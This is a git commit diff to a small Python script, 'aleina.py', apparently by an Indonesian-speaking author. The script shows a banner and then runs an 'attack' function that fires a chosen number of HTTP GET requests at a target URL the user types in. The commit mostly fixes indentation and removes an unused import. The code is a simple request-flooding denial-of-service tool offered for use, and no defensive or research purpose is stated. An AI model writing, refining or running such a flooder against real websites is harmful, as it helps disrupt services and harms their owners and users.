109cf7d96d363578fd04a31e12720cfaa8123db3
elmiya0711 <elmiya0711@gmail.com>
2026-05-25 17:46:32 +0700

    update

--- aleina.py
+++ aleina.py
@@ -1,37 +1,35 @@
 import asyncio
 import aiohttp
 from rich.console import Console
-from colorama import Fore, init
 
 console = Console()
 
 # Banner
 console.print("[cyan]")
-console.print(" ███╗   ███╗██╗   ██╗ ███████╗██╗   ")
-console.print(" ████╗ ████║╚██╗ ██╔╝ ██╔════╝██║   ")
-console.print(" ██╔████╔██║ ╚████╔╝  █████╗  ██║  ")
-console.print(" ██║╚██╔╝██║  ╚██╔╝   ██╔══╝  ██║   ")
+console.print(" ███╗   ███╗██╗   ██╗ ███████╗██╗")
+console.print(" ████╗ ████║╚██╗ ██╔╝ ██╔════╝██║")
+console.print(" ██╔████╔██║ ╚████╔╝  █████╗  ██║")
+console.print(" ██║╚██╔╝██║  ╚██╔╝   ██╔══╝  ██║")
 console.print(" ██║ ╚═╝ ██║   ██║    ███████╗███████╗")
-console.print(" ╚═╝     ╚═╝   ╚═╝    ╚══════╝╚══════╝ ")
-console.print("       La Tahzan Innallah Ma’ana")
-
-
+console.print(" ╚═╝     ╚═╝   ╚═╝    ╚══════╝╚══════╝")
+console.print("   La Tahzan Innallah Ma’ana")
+console.print(" =========================================")
 async def attack(url, jumlah):
-  sukses = 0
-  gagal = 0
-‎    async with aiohttp.ClientSession() as session:
-‎        for i in range(jumlah):
-‎            try:
-‎                async with session.get(url) as resp:
-‎                    console.print(f"[green]OK {resp.status}[/green]")
-‎                    sukses += 1
-‎            except Exception as e:
-‎                console.print(f"[red]ERROR {e}[/red]")
-‎                gagal += 1
-‎    console.print(f"[cyan]Total request: {jumlah}[/cyan]")
-‎    console.print(f"[green]Sukses: {sukses}[/green]")
-‎    console.print(f"[red]Gagal: {gagal}[/red]")
-‎
-‎url = input("URL Target: ")
-‎jumlah = int(input("Jumlah request: "))
-‎asyncio.run(attack(url, jumlah))
+    sukses = 0
+    gagal = 0
+    async with aiohttp.ClientSession() as session:
+        for i in range(jumlah):
+            try:
+                async with session.get(url) as resp:
+                    console.print(f"[green]OK {resp.status}[/green]")
+                    sukses += 1
+            except Exception as e:
+                console.print(f"[red]ERROR {e}[/red]")
+                gagal += 1
+    console.print(f"[cyan]Total request: {jumlah}[/cyan]")
+    console.print(f"[green]Sukses: {sukses}[/green]")
+    console.print(f"[red]Gagal: {gagal}[/red]")
+
+url = input("URL Target: ")
+jumlah = int(input("Jumlah request: "))
+asyncio.run(attack(url, jumlah))
